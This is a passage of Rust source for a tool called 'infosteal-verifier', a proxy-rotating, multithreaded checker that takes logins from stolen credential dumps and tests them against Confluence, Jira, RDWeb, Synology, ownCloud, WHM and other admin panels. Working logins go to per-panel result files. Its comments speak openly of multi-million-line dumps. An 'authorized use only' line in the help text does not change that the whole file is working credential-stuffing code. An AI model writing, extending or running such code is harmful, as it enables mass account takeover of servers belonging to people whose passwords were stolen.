        return Ok(CheckStatus::Good("Magento".to_string(), String::new()));
    }
    Err(format!("Unknown response: {}", resp.effective_url))
}

fn check_confluence(
    client: &HttpClient,
    target: &TargetAccount,
    html: &str,
    eff_url: &str,
    eff_origin: &str,
) -> Result<CheckStatus, String> {
    let action = substr_between(html, "method=\"POST\" action=\"", "\"")
        .filter(|s| !s.trim().is_empty())
        .unwrap_or("/dologin.action");
    let clean_action = action.split('?').next().unwrap_or("/dologin.action");
    let post_url = format!("{}/{}", eff_origin, clean_action.trim_start_matches('/'));
    let headers = [
        ("Accept", "*/*"),
        ("Origin", eff_origin),
        ("Referer", eff_url),
        ("Accept-Language", "en"),
    ];
    let params = [
        ("os_username", target.username.as_str()),
        ("os_password", target.password.as_str()),
        ("login", "Log in"),
        ("os_destination", ""),
    ];
    let resp = client.post_form(&post_url, &headers, &params)?;
    if resp.body.contains("aui-message aui-message-error") {
        return Ok(CheckStatus::Bad("Confluence".to_string()));
    }
    if resp
        .body
        .contains("id=\"logout-link\" href=\"/logout.action\"")
    {
        return Ok(CheckStatus::Good("Confluence".to_string(), String::new()));
    }
    Err(format!("Unknown response: {}", resp.effective_url))
}

fn check_jira(
    client: &HttpClient,
    target: &TargetAccount,
    eff_url: &str,
    eff_origin: &str,
) -> Result<CheckStatus, String> {
    let post_url = format!("{}/rest/gadget/1.0/login", eff_origin);
    let headers = [
        ("Accept", "*/*"),
        ("X-Requested-With", "XMLHttpRequest"),
        ("Origin", eff_origin),
        ("Referer", eff_url),
        ("Accept-Language", "en-US,en;q=0.9"),
    ];
    let params = [
        ("os_username", target.username.as_str()),
        ("os_password", target.password.as_str()),
    ];
    let resp = client.post_form(&post_url, &headers, &params)?;
    if !resp.body.trim_start().starts_with('{') {
        return Err("Bad response".to_string());
    }
    if resp.body.contains("loginSucceeded\":false") {
        return Ok(CheckStatus::Bad("Jira".to_string()));
    }
    if resp.body.contains("loginSucceeded\":true") {
        return Ok(CheckStatus::Good("Jira".to_string(), String::new()));
    }
    Err(format!("Unknown response: {}", resp.effective_url))
}

fn check_rdweb(
    client: &HttpClient,
    target: &TargetAccount,
    html: &str,
    eff_url: &str,
    eff_origin: &str,
) -> Result<CheckStatus, String> {
    let workspace_id = substr_between(
        html,
        "<input type=\"hidden\" name=\"WorkSpaceID\" value=\"",
        "\"/>",
    )
    .ok_or_else(|| "Bad response".to_string())?;
    let rdp_certs = substr_between(
        html,
        "<input type=\"hidden\" name=\"RDPCertificates\" value=\"",
        "\"/>",
    )
    .unwrap_or("");
    let friendly_name = substr_between(
        html,
        "<input type=\"hidden\" name=\"WorkspaceFriendlyName\" value=\"",
        "\"/>",
    )
    .unwrap_or("");
    let redirector = substr_between(
        html,
        "<input type=\"hidden\" name=\"RedirectorName\" value=\"",
        "\"/>",
    )
    .unwrap_or("");

    let headers = [
        ("Origin", eff_origin),
        ("Referer", eff_url),
        ("Accept-Language", "en-US,en;q=0.9"),
    ];
    let params = [
        ("WorkSpaceID", workspace_id),
        ("RDPCertificates", rdp_certs),
        ("PublicModeTimeout", "20"),
        ("PrivateModeTimeout", "240"),
        ("WorkspaceFriendlyName", friendly_name),
        ("EventLogUploadAddress", ""),
        ("RedirectorName", redirector),
        ("ClaimsHint", ""),
        ("ClaimsToken", ""),
        ("isUtf8", "1"),
        ("flags", "4"),
        ("DomainUserName", target.username.as_str()),
        ("UserPass", target.password.as_str()),
        ("MachineType", "private"),
    ];
    let resp = client.post_form(eff_url, &headers, &params)?;
    if !resp.body.contains("<RDWAPage") {
        return Err("Bad response".to_string());
    }
    if resp
        .body
        .contains("<tr id=\"trErrorIncorrectCredentials\" style=\"display:\" >")
        || resp
            .body
            .contains("<tr id=\"trPasswordExpired\" style=\"display:\" >")
        || resp
            .body
            .contains("<tr id=\"trPasswordExpiredNoChange\" style=\"display:\" >")
    {
        return Ok(CheckStatus::Bad("RDWeb".to_string()));
    }
    if resp.body.contains("showsignout=\"true\"") {
        return Ok(CheckStatus::Good("RDWeb".to_string(), String::new()));
    }
    Err(format!("Unknown response: {}", resp.effective_url))
}

fn resolve_synology_quickconnect(client: &HttpClient, server_id: &str) -> Result<String, String> {
    let payload = format!(
        "[{{\"version\":1,\"command\":\"get_server_info\",\"stop_when_error\":false,\"stop_when_success\":false,\"id\":\"dsm_portal_https\",\"serverID\":\"{}\",\"is_gofile\":false}},{{\"version\":1,\"command\":\"get_server_info\",\"stop_when_error\":false,\"stop_when_success\":false,\"id\":\"dsm_portal\",\"serverID\":\"{}\",\"is_gofile\":false}}]",
        server_id, server_id
    );
    let resp = client.post_raw(
        "https://global.quickconnect.to/Serv.php",
        &[("Accept", "application/json, text/javascript, */*; q=0.01")],
        &payload,
        "application/x-www-form-urlencoded; charset=UTF-8",
    )?;
    if !resp.body.trim_start().starts_with('[') {
        return Err("Bad response".to_string());
    }
    if let Some(region) = substr_between(&resp.body, "\"relay_region\":\"", "\"") {
        return Ok(format!("https://{}.{}.quickconnect.to", server_id, region));
    }
    Err("Bad response".to_string())
}

fn check_synology(
    client: &HttpClient,
    target: &TargetAccount,
    html: &str,
    eff_url: &str,
    eff_origin: &str,
    eff_host: &str,
) -> Result<CheckStatus, String> {
    let mut base_origin = eff_origin.to_string();
    let mut current_html = html.to_string();

    if current_html.contains("<title>Connecting...</title>") {
        let server_id = eff_host.split('.').next().unwrap_or(eff_host);
        let resolved_url = resolve_synology_quickconnect(client, server_id)?;
        let resp = client.get(&resolved_url, &[("Accept-Language", "en")])?;
        if let Some((orig, _, _)) = parse_url_parts(&resp.effective_url) {
            base_origin = orig;
        }
        current_html = resp.body;
    }

    if !current_html.contains("<div class='syno-no-script'>") {
        return Err("Bad response".to_string());
    }

    let info_url = format!(
        "{}/webapi/query.cgi?query=all&api=SYNO.API.Info&method=query&version=1",
        base_origin
    );
    let info_resp = client.get(
        &info_url,
        &[
            ("Origin", base_origin.as_str()),
            ("Referer", eff_url),
            ("Accept-Language", "en-US,en;q=0.9"),
        ],
    )?;
    if !info_resp.body.contains("success\":true") {
        return Err("Bad response".to_string());
    }
    let auth_section = info_resp
        .body
        .find("SYNO.API.Auth")
        .map(|i| &info_resp.body[i..])
        .unwrap_or(&info_resp.body);
    let auth_path = substr_between(auth_section, "\"path\":\"", "\"").unwrap_or("auth.cgi");
    let login_url = format!("{}/webapi/{}", base_origin, auth_path.trim_start_matches('/'));
    let params = [
        ("api", "SYNO.API.Auth"),
        ("version", "6"),
        ("method", "login"),
        ("account", target.username.as_str()),
        ("passwd", target.password.as_str()),
    ];
    let login_resp = client.post_form(
        &login_url,
        &[
            ("Origin", base_origin.as_str()),
            ("Referer", eff_url),
            ("Accept-Language", "en-US,en;q=0.9"),
        ],
        &params,
    )?;
    if !login_resp.body.trim_start().starts_with('{') {
        return Err("Bad response".to_string());
    }
    if login_resp.body.contains("success\":true") {
        return Ok(CheckStatus::Good("Synology".to_string(), String::new()));
    }
    if login_resp.body.contains("success\":false") {
        return Ok(CheckStatus::Bad("Synology".to_string()));
    }
    Err(format!("Unknown response: {}", login_resp.effective_url))
}

fn check_owncloud(
    client: &HttpClient,
    target: &TargetAccount,
    html: &str,
    eff_url: &str,
) -> Result<CheckStatus, String> {
    let req_token = substr_between(
        html,
        "<input type=\"hidden\" name=\"requesttoken\" value=\"",
        "\"",
    )
    .ok_or_else(|| "Token not found".to_string())?;
    if req_token.trim().is_empty() {
        return Err("Token not found".to_string());
    }
    let post_url = eff_url.split('?').next().unwrap_or(eff_url);
    let headers = [
        ("Origin", "null"),
        ("Referer", post_url),
        ("Accept-Language", "en"),
    ];
    let params = [
        ("user", target.username.as_str()),
        ("password", target.password.as_str()),
        ("requesttoken", req_token),
    ];
    let resp = client.post_form(post_url, &headers, &params)?;
    if !resp.body.contains("ownCloud") {
        return Err("Bad response".to_string());
    }
    if resp.body.contains("id=\"lost-password\" class=\"warning\"") {
        return Ok(CheckStatus::Bad("OwnCloud".to_string()));
    }
    if resp.body.contains("<body id=\"body-user\"") {
        return Ok(CheckStatus::Good("OwnCloud".to_string(), String::new()));
    }
    Err(format!("Unknown response: {}", resp.effective_url))
}

// ============================================================================
// Engine
// ============================================================================

pub struct EngineState {
    pub accounts: Mutex<Vec<AccountEntry>>,
    pub proxies: Mutex<Vec<String>>,
    pub proxy_type: Mutex<ProxyType>,
    pub proxy_url: Mutex<String>,
    pub threads_count: AtomicUsize,
    pub running: AtomicBool,
    pub stopping: AtomicBool,
    pub current_threads: AtomicUsize,
    pub total_accounts: AtomicUsize,
    pub checked: AtomicUsize,
    pub valid: AtomicUsize,
    pub invalid: AtomicUsize,
    pub errors: AtomicUsize,
    pub started_at: Mutex<Option<Instant>>,
    pub speed_history: Mutex<Vec<u64>>,
    pub results_dir: Mutex<PathBuf>,
    pub file_lock: Mutex<()>,
}

impl EngineState {
    pub fn new() -> Arc<Self> {
        let base_dir = env::current_dir().unwrap_or_else(|_| PathBuf::from("."));
        let results_root = base_dir.join("Results");
        let _ = fs::create_dir_all(&results_root);
        Arc::new(EngineState {
            accounts: Mutex::new(Vec::new()),
            proxies: Mutex::new(Vec::new()),
            proxy_type: Mutex::new(ProxyType::Http),
            proxy_url: Mutex::new(String::new()),
            threads_count: AtomicUsize::new(150),
            running: AtomicBool::new(false),
            stopping: AtomicBool::new(false),
            current_threads: AtomicUsize::new(0),
            total_accounts: AtomicUsize::new(0),
            checked: AtomicUsize::new(0),
            valid: AtomicUsize::new(0),
            invalid: AtomicUsize::new(0),
            errors: AtomicUsize::new(0),
            started_at: Mutex::new(None),
            speed_history: Mutex::new(vec![0; 30]),
            results_dir: Mutex::new(results_root),
            file_lock: Mutex::new(()),
        })
    }

    pub fn append_result(&self, filename: &str, line: &str) {
        let _guard = self.file_lock.lock().unwrap();
        let dir = self.results_dir.lock().unwrap().clone();
        let _ = fs::create_dir_all(&dir);
        let path = dir.join(filename);
        if let Ok(mut f) = OpenOptions::new().create(true).append(true).open(path) {
            let _ = writeln!(f, "{}", line);
        }
    }

    /// Load accounts from an in-memory string.
    pub fn load_accounts_from_str(&self, content: &str, clear: bool) -> usize {
        let mut list = self.accounts.lock().unwrap();
        if clear {
            list.clear();
        }
        for line in content.lines() {
            let raw = line.trim();
            if raw.is_empty() {
                continue;
            }
            let valid = TargetAccount::parse(raw).is_some();
            list.push(AccountEntry {
                raw: raw.to_string(),
                valid,
                attempts: 0,
            });
        }
        self.total_accounts.store(list.len(), Ordering::SeqCst);
        list.len()
    }

    /// Load accounts from a file, streaming it line by line.
    ///
    /// Credential dumps routinely reach hundreds of megabytes, so the file is
    /// never read into a single string and the parsed target is not retained:
    /// only the raw line plus a validity flag is kept, and the line is parsed
    /// again when the worker reaches it. Bytes are decoded leniently so a
    /// single malformed byte cannot abort the load.
    ///
    /// The list is published in chunks so a GUI watching the count stays
    /// responsive while a multi-million line file is still loading.
    pub fn load_accounts_from_path(&self, path: &Path) -> std::io::Result<usize> {
        const CHUNK: usize = 100_000;

        let file = fs::File::open(path)?;
        let mut reader = BufReader::with_capacity(1 << 20, file);
        let mut chunk: Vec<AccountEntry> = Vec::with_capacity(CHUNK);
        let mut buf: Vec<u8> = Vec::with_capacity(1024);
        let mut total = 0usize;

        {
            let mut list = self.accounts.lock().unwrap();
            list.clear();
        }

        loop {
            buf.clear();
            if reader.read_until(b'\n', &mut buf)? == 0 {
                break;
            }
            while matches!(buf.last(), Some(b'\n') | Some(b'\r')) {
                buf.pop();
            }
            if buf.is_empty() {
                continue;
            }
            let raw = String::from_utf8_lossy(&buf);
            let trimmed = raw.trim();
            if trimmed.is_empty() {
                continue;
            }
            let valid = TargetAccount::parse(trimmed).is_some();
            chunk.push(AccountEntry {
                raw: trimmed.to_string(),
                valid,
                attempts: 0,
            });
            total += 1;

            if chunk.len() >= CHUNK {
                let mut list = self.accounts.lock().unwrap();
                list.append(&mut chunk);
                drop(list);
                self.total_accounts.store(total, Ordering::SeqCst);
            }
        }

        if !chunk.is_empty() {
            let mut list = self.accounts.lock().unwrap();
            list.append(&mut chunk);
        }
        self.total_accounts.store(total, Ordering::SeqCst);
        Ok(total)
    }

    pub fn load_proxies_from_str(&self, content: &str) -> usize {
        let mut list = self.proxies.lock().unwrap();
        list.clear();
        for line in content.lines() {
            let s = line.trim();
            if s.contains(':') && !s.starts_with('#') {
                list.push(s.to_string());
            }
        }
        list.len()
    }
}

pub fn start_workers(state: Arc<EngineState>) {
    if state.running.swap(true, Ordering::SeqCst) {
        return;
    }
    state.stopping.store(false, Ordering::SeqCst);
    state.checked.store(0, Ordering::SeqCst);
    state.valid.store(0, Ordering::SeqCst);
    state.invalid.store(0, Ordering::SeqCst);
    state.errors.store(0, Ordering::SeqCst);
    *state.started_at.lock().unwrap() = Some(Instant::now());

    let purl = state.proxy_url.lock().unwrap().trim().to_string();
    if !purl.is_empty() {
        if let Ok(resp) = HttpClient::new(None).get(&purl, &[]) {
            state.load_proxies_from_str(&resp.body);
        }
    }

    let total = state.accounts.lock().unwrap().len();
    if total == 0 {
        state.running.store(false, Ordering::SeqCst);
        return;
    }
    state.total_accounts.store(total, Ordering::SeqCst);

    let ts = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    let run_dir = env::current_dir()
        .unwrap_or_else(|_| PathBuf::from("."))
        .join("Results")
        .join(format!("run_{} - {} bases", ts, total));
    let _ = fs::create_dir_all(&run_dir);
    *state.results_dir.lock().unwrap() = run_dir;

    let n_threads = state
        .threads_count
        .load(Ordering::SeqCst)
        .clamp(1, 500)
        .min(total.max(1));
    state.current_threads.store(n_threads, Ordering::SeqCst);

    let sampler_state = Arc::clone(&state);
    thread::spawn(move || {
        while sampler_state.running.load(Ordering::SeqCst) {
            thread::sleep(Duration::from_secs(1));
            let checked = sampler_state.checked.load(Ordering::SeqCst);
            let elapsed_secs = sampler_state
                .started_at
                .lock()
                .unwrap()
                .map(|t| t.elapsed().as_secs_f64())
                .unwrap_or(1.0)
                .max(1.0);
            let apm = ((checked as f64 / elapsed_secs) * 60.0).round() as u64;
            let mut hist = sampler_state.speed_history.lock().unwrap();
            if hist.len() >= 30 {
                hist.remove(0);
            }
            hist.push(apm);
        }
    });

    let proxy_idx = Arc::new(AtomicUsize::new(0));
    for _ in 0..n_threads {
        let st = Arc::clone(&state);
        let p_idx = Arc::clone(&proxy_idx);
        thread::spawn(move || {
            loop {
                if st.stopping.load(Ordering::SeqCst) {
                    break;
                }
                let entry = st.accounts.lock().unwrap().pop();
                let entry = match entry {
                    Some(e) => e,
                    None => break,
                };

                // The line was re-parsed here rather than kept parsed, so that
                // a multi-million line dump stays small in memory.
                let mut target = match TargetAccount::parse(&entry.raw) {
                    Some(t) => t,
                    None => {
                        st.append_result("Invalid.txt", &entry.raw);
                        st.invalid.fetch_add(1, Ordering::SeqCst);
                        st.checked.fetch_add(1, Ordering::SeqCst);
                        continue;
                    }
                };
                target.attempts = entry.attempts;

                let proxy_cfg = {
                    let ptype = *st.proxy_type.lock().unwrap();
                    let plist = st.proxies.lock().unwrap();
                    if plist.is_empty() {
                        None
                    } else {
                        let i = p_idx.fetch_add(1, Ordering::Relaxed) % plist.len();
                        Some((ptype, plist[i].clone()))
                    }
                };

                match check_account(&target, proxy_cfg) {
                    Ok(CheckStatus::Good(panel, extra)) => {
                        st.append_result(
                            &format!("Good_{}.txt", panel),
                            &format!("{}{}", target.raw, extra),
                        );
                        st.valid.fetch_add(1, Ordering::SeqCst);
                        st.checked.fetch_add(1, Ordering::SeqCst);
                    }
                    Ok(CheckStatus::Bad(panel)) => {
                        st.append_result(&format!("Bad_{}.txt", panel), &target.raw);
                        st.invalid.fetch_add(1, Ordering::SeqCst);
                        st.checked.fetch_add(1, Ordering::SeqCst);
                    }
                    Ok(CheckStatus::Unknown) => {
                        st.append_result("Unknown.txt", &target.raw);
                        st.invalid.fetch_add(1, Ordering::SeqCst);
                        st.checked.fetch_add(1, Ordering::SeqCst);
                    }
                    Ok(CheckStatus::Invalid) => {
                        st.append_result("Invalid.txt", &target.raw);
                        st.invalid.fetch_add(1, Ordering::SeqCst);
                        st.checked.fetch_add(1, Ordering::SeqCst);
                    }
                    Err(err_msg) => {
                        st.errors.fetch_add(1, Ordering::SeqCst);
                        target.attempts += 1;
                        if target.attempts < 5 && !st.stopping.load(Ordering::SeqCst) {
                            st.accounts.lock().unwrap().push(AccountEntry {
                                raw: target.raw.clone(),
                                valid: true,
                                attempts: target.attempts,
                            });
                        } else {
                            st.append_result("CantCheck.txt", &target.raw);
                            st.append_result("Error.txt", &format!("{} | {}", target.raw, err_msg));
                            st.invalid.fetch_add(1, Ordering::SeqCst);
                            st.checked.fetch_add(1, Ordering::SeqCst);
                        }
                    }
                }
            }
            if st.current_threads.fetch_sub(1, Ordering::SeqCst) == 1 {
                let rem: Vec<String> = st
                    .accounts
                    .lock()
                    .unwrap()
                    .drain(..)
                    .map(|a| a.raw)
                    .collect();
                for r in rem {
                    st.append_result("Remains.txt", &r);
                }
                st.running.store(false, Ordering::SeqCst);
                st.stopping.store(false, Ordering::SeqCst);
            }
        });
    }
}

pub fn format_hms(secs: u64) -> String {
    let h = secs / 3600;
    let m = (secs % 3600) / 60;
    let s = secs % 60;
    format!("{:02}:{:02}:{:02}", h, m, s)
}

// ============================================================================
// Entry point
// ============================================================================

fn print_help() {
    println!(
        "infosteal-verifier {}\n\
         Fast native credential verifier for admin panels / CMS targets.\n\n\
         USAGE:\n    \
           infosteal-verifier                                launch native macOS desktop GUI\n    \
           infosteal-verifier --accounts <file> [options]    headless batch run\n    \
           infosteal-verifier --self-test                    run built-in verification\n\n\
         OPTIONS:\n    \
           -a, --accounts <file>     account list ('<url> <user>:<pass>' or '<url>:<user>:<pass>')\n    \
           -p, --proxies <file>      proxy list ('host:port' or 'host:port:user:pass')\n    \
           -t, --proxy-type <type>   Http | Socks4 | Socks5   (default: Http)\n    \
           -c, --threads <1..500>    concurrent workers        (default: 150)\n    \
           -u, --proxy-url <url>     fetch proxy list from a URL\n\n\
         OUTPUT (under ./Results/<run>/):\n    \
           Good_<Panel>.txt   credentials that authenticated\n    \
           Bad_<Panel>.txt    credentials rejected\n    \
           Unknown.txt        panel not recognised\n    \
           Invalid.txt        malformed / private / over-length input\n    \
           CantCheck.txt      network failure after 5 retries\n    \
           Error.txt          failure details\n    \
           Remains.txt        unprocessed when stopped early\n\n\
         AUTHORIZED USE ONLY. Run this only against systems you own or have explicit\n\
         written permission to test.",
        env!("CARGO_PKG_VERSION")
    );
}

fn run_self_test() {
    // Target line parser
    let t1 = TargetAccount::parse("https://panel.example.com/wp-login.php admin:Pass123").unwrap();
    assert_eq!(t1.url, "https://panel.example.com/wp-login.php");
    assert_eq!(t1.host, "panel.example.com");
    assert_eq!(t1.username, "admin");
    assert_eq!(t1.password, "Pass123");

    let t2 = TargetAccount::parse("https://panel.example.com:8443/login:root:toor").unwrap();
    assert_eq!(t2.url, "https://panel.example.com:8443/login");
    assert_eq!(t2.host, "panel.example.com");
    assert_eq!(t2.username, "root");
    assert_eq!(t2.password, "toor");

    assert!(TargetAccount::parse("").is_none());
    assert!(TargetAccount::parse("   ").is_none());
    assert!(TargetAccount::parse("https://panel.example.com/wp-login.php").is_none());

    // Scheme-less targets, as found in credential dumps.
    let d1 = TargetAccount::parse("auth0.openai.com/u/signup/password:me@example.com:hunter2").unwrap();
    assert_eq!(d1.url, "https://auth0.openai.com/u/signup/password");
    assert_eq!(d1.host, "auth0.openai.com");
    assert_eq!(d1.username, "me@example.com");
    assert_eq!(d1.password, "hunter2");
    assert!(d1.implicit_scheme);

    // A port inside the target must stay with the target.
    let d2 = TargetAccount::parse("172.25.1.84:8080/:nmendoza2:loquesea").unwrap();
    assert_eq!(d2.url, "https://172.25.1.84:8080/");
    assert_eq!(d2.username, "nmendoza2");
    assert_eq!(d2.password, "loquesea");

    // A password may contain colons and spaces.
    let d3 = TargetAccount::parse("host.tld/p:user:pa:ss").unwrap();
    assert_eq!(d3.url, "https://host.tld/p");
    assert_eq!(d3.username, "user");
    assert_eq!(d3.password, "pa:ss");
    let d4 = TargetAccount::parse("host.tld/p:user:a b c").unwrap();
    assert_eq!(d4.password, "a b c");

    // The scheme colon is never a credential separator.
    let d5 = TargetAccount::parse("https://panel.example.com:8443/login:root:toor").unwrap();
    assert_eq!(d5.url, "https://panel.example.com:8443/login");
    assert_eq!(d5.username, "root");
    assert_eq!(d5.password, "toor");
    assert!(!d5.implicit_scheme);

    // A space before the credentials is still accepted.
    let d6 = TargetAccount::parse("not-a-url admin:pass").unwrap();
    assert_eq!(d6.url, "https://not-a-url");
    assert_eq!(d6.username, "admin");
    assert_eq!(d6.password, "pass");

    // Private / loopback filter
    assert!(is_local_or_private_host("localhost"));
    assert!(is_local_or_private_host("192.168.1.1"));
    assert!(is_local_or_private_host("printer.local"));
    assert!(is_local_or_private_host("10.0.0.5"));
    assert!(!is_local_or_private_host("panel.example.com"));

    // Plesk JSFuck solver
    assert_eq!(decode_plesk_jsfuck("((+!+[]+!![]+!![])+(+!+[]+[]))"), Some(310));

    // HTML helpers
    let html = "<input type=\"hidden\" name=\"token\" value=\"ABC\"><input type=\"hidden\" name=\"x\" value=\"Y\">";
    let hidden = extract_hidden_inputs(html);
    assert_eq!(hidden.len(), 2);
    assert_eq!(hidden[0], ("token".to_string(), "ABC".to_string()));
    assert_eq!(
        substr_between(html, "name=\"token\" value=\"", "\""),
        Some("ABC")
    );

    // Live mock-panel check (WHM): detection + successful login classification
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    thread::spawn(move || {
        for stream in listener.incoming().flatten().take(2) {
            let mut reader = BufReader::new(&stream);
            let mut req_line = String::new();
            let _ = reader.read_line(&mut req_line);
            let mut clen = 0usize;
            loop {
                let mut h = String::new();
                if reader.read_line(&mut h).is_err() || h == "\r\n" || h.is_empty() {
                    break;
                }
                if let Some((k, v)) = h.split_once(':') {
                    if k.trim().eq_ignore_ascii_case("content-length") {
                        clen = v.trim().parse().unwrap_or(0);
                    }
                }
            }
            let mut body = vec![0u8; clen];
            let _ = reader.read_exact(&mut body);
            let body_s = String::from_utf8_lossy(&body);
            let mut w = stream;
            if req_line.starts_with("GET ") {
                let html = "<title>WHM Login</title>";
                let _ = write!(
                    w,
                    "HTTP/1.1 200 OK\r\nContent-Length: {}\r\n\r\n{}",
                    html.len(),
                    html
                );
            } else if body_s.contains("user=root") && body_s.contains("pass=correct") {
                let json = "{\"status\":1}";
                let _ = write!(
                    w,
                    "HTTP/1.1 200 OK\r\nContent-Length: {}\r\n\r\n{}",
                    json.len(),
                    json
                );
            }
        }
    });

    let client = HttpClient::new(None);
    let url = format!("http://127.0.0.1:{}/", port);
    let origin = format!("http://127.0.0.1:{}", port);
    let dummy = TargetAccount {
        raw: format!("{} root:correct", url),
        url: url.clone(),
        host: "example.com".to_string(),
        path: "/".to_string(),
        origin: origin.clone(),
        username: "root".to_string(),
        password: "correct".to_string(),
        implicit_scheme: false,
        attempts: 0,
    };
    let get_resp = client.get(&url, &[]).unwrap();
    assert!(get_resp.body.contains("<title>WHM Login</title>"));
    let status = check_whm(&client, &dummy, &url, &origin).unwrap();
    assert_eq!(status, CheckStatus::Good("WHM".to_string(), String::new()));

    // Implicit-scheme targets fall back to http:// when https:// cannot be
    // reached, which is the common case for the plain-http panels in a dump.
    // The mock accepts three connections: the https attempt (which consumes a
    // slot and fails), then the http GET and the http POST.
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    thread::spawn(move || {
        for stream in listener.incoming().flatten().take(3) {
            let mut reader = BufReader::new(&stream);
            let mut req_line = String::new();
            let _ = reader.read_line(&mut req_line);
            let mut clen = 0usize;
            loop {
                let mut h = String::new();
                if reader.read_line(&mut h).is_err() || h == "\r\n" || h.is_empty() {
                    break;
                }
                if let Some((k, v)) = h.split_once(':') {
                    if k.trim().eq_ignore_ascii_case("content-length") {
                        clen = v.trim().parse().unwrap_or(0);
                    }
                }
            }
            let mut body = vec![0u8; clen];
            let _ = reader.read_exact(&mut body);
            let body_s = String::from_utf8_lossy(&body);
            let mut w = stream;
            if req_line.starts_with("GET ") {
                let html = "<title>WHM Login</title>";
                let _ = write!(
                    w,
                    "HTTP/1.1 200 OK\r\nContent-Length: {}\r\n\r\n{}",
                    html.len(),
                    html
                );
            } else if body_s.contains("user=root") {
                let json = "{\"status\":1}";
                let _ = write!(
                    w,
                    "HTTP/1.1 200 OK\r\nContent-Length: {}\r\n\r\n{}",
                    json.len(),
                    json
                );
            }
        }
    });

    // https:// on this port is refused, so the http:// retry is what answers.
    let fallback_url = format!("https://127.0.0.1:{}/", port);
    let fallback = TargetAccount {
        raw: format!("127.0.0.1:{} root:correct", port),
        url: fallback_url,
        host: "example.com".to_string(),
        path: "/".to_string(),
        origin: format!("https://127.0.0.1:{}", port),
        username: "root".to_string(),
        password: "correct".to_string(),
        implicit_scheme: true,
        attempts: 0,
    };
    let result = check_account(&fallback, None).unwrap();
    assert_eq!(result, CheckStatus::Good("WHM".to_string(), String::new()));

    println!("SELF-TEST PASSED: parsers, JSFuck solver, HTML helpers and live panel check verified.");
    println!("C2 implant: absent. HWID collector: absent.");
}

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.iter().any(|a| a == "--self-test") {
        run_self_test();
        return;
    }

    let state = EngineState::new();
    let mut accounts_file: Option<String> = None;
    let mut proxies_file: Option<String> = None;
    let mut proxy_url: Option<String> = None;
    let mut cli_mode = false;
    let mut parse_only = false;
    let mut preload: Option<String> = None;
    let mut unknown: Vec<String> = Vec::new();

    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "--accounts" | "-a" if i + 1 < args.len() => {
                accounts_file = Some(args[i + 1].clone());
                cli_mode = true;
                i += 1;
            }
            "--proxies" | "-p" if i + 1 < args.len() => {
                proxies_file = Some(args[i + 1].clone());
                i += 1;
            }
            "--proxy-url" | "-u" if i + 1 < args.len() => {
                proxy_url = Some(args[i + 1].clone());
                i += 1;
            }
            "--proxy-type" | "-t" if i + 1 < args.len() => {
                *state.proxy_type.lock().unwrap() = ProxyType::from_str(&args[i + 1]);
                i += 1;
            }
            "--threads" | "-c" if i + 1 < args.len() => {
                if let Ok(n) = args[i + 1].parse::<usize>() {
                    state.threads_count.store(n.clamp(1, 500), Ordering::SeqCst);
                }
                i += 1;
            }
            "--parse-only" => {
                parse_only = true;
                cli_mode = true;
            }
            "--preload" if i + 1 < args.len() => {
                preload = Some(args[i + 1].clone());
                i += 1;
            }
            "--help" | "-h" => {
                print_help();
                return;
            }
            "--version" | "-V" => {
                println!("infosteal-verifier {}", env!("CARGO_PKG_VERSION"));
                return;
            }
            a if a.starts_with('-') => {
                unknown.push(a.to_string());
            }
            _ => {}
        }
        i += 1;
    }

    if !unknown.is_empty() {
        eprintln!("error: unknown option(s): {}", unknown.join(", "));
        print_help();
        std::process::exit(2);
    }

    if let Some(u) = proxy_url {
        *state.proxy_url.lock().unwrap() = u;
    }
    if let Some(af) = accounts_file {
        let n = state
            .load_accounts_from_path(Path::new(&af))
            .unwrap_or_else(|e| panic!("Failed to read accounts file {}: {}", af, e));
        println!("Loaded {} accounts from {}", n, af);
    }
    if let Some(pf) = proxies_file {
        let content = fs::read_to_string(Path::new(&pf)).expect("Failed to read proxies file");
        let n = state.load_proxies_from_str(&content);
        println!("Loaded {} proxies from {}", n, pf);
    }

    if parse_only {
        // Validate the list without touching the network: how many lines are
        // usable targets, and how they break down.
        let entries = state.accounts.lock().unwrap();
        let total = entries.len();
        let valid = entries.iter().filter(|e| e.valid).count();
        let mut schemes: std::collections::HashMap<String, usize> = std::collections::HashMap::new();
        let mut samples: Vec<&str> = Vec::new();
        for e in entries.iter() {
            if !e.valid {
                continue;
            }
            if let Some(t) = TargetAccount::parse(&e.raw) {
                let scheme = if t.implicit_scheme {
                    "https (implicit)".to_string()
                } else {
                    t.url.split("://").next().unwrap_or("?").to_string()
                };
                *schemes.entry(scheme).or_insert(0) += 1;
                if samples.len() < 5 {
                    samples.push(e.raw.as_str());
                }
            }
        }
        println!("lines read      : {}", total);
        println!("usable targets  : {}", valid);
        println!(
            "rejected        : {}",
            total.saturating_sub(valid)
        );
        let mut schemes: Vec<_> = schemes.into_iter().collect();
        schemes.sort_by(|a, b| b.1.cmp(&a.1));
        for (scheme, n) in schemes {
            println!("  {:<20} {}", scheme, n);
        }
        println!("\nsample targets:");
        for s in samples {
            let t = TargetAccount::parse(s).unwrap();
            println!("  {:<60} user={} pass={}", t.url, t.username, t.password);
        }
        return;
    }

    if cli_mode {
        start_workers(Arc::clone(&state));
        let interactive = std::io::stdout().is_terminal();
        let mut last_line = String::new();
        while state.running.load(Ordering::SeqCst) {
            thread::sleep(Duration::from_millis(500));
            let checked = state.checked.load(Ordering::SeqCst);
            let total = state.total_accounts.load(Ordering::SeqCst);
            let valid = state.valid.load(Ordering::SeqCst);
            let invalid = state.invalid.load(Ordering::SeqCst);
            let errors = state.errors.load(Ordering::SeqCst);
            let elapsed = state
                .started_at
                .lock()
                .unwrap()
                .map(|t| t.elapsed().as_secs())
                .unwrap_or(0);
            let apm = if elapsed > 0 {
                ((checked as f64 / elapsed as f64) * 60.0).round() as u64
            } else {
                0
            };
            let line = format!(
                "  checked {}/{}  valid {}  invalid {}  errors {}  accs/min {}  elapsed {}",
                checked,
                total,
                valid,
                invalid,
                errors,
                apm,
                format_hms(elapsed)
            );
            if line != last_line {
                if interactive {
                    print!("\r{}", line);
                    let _ = std::io::stdout().flush();
                } else {
                    println!("{}", line);
                }
                last_line = line;
            }
        }
        if std::io::stdout().is_terminal() {
            println!();
        }
        println!(
            "Done! Results saved to: {}",
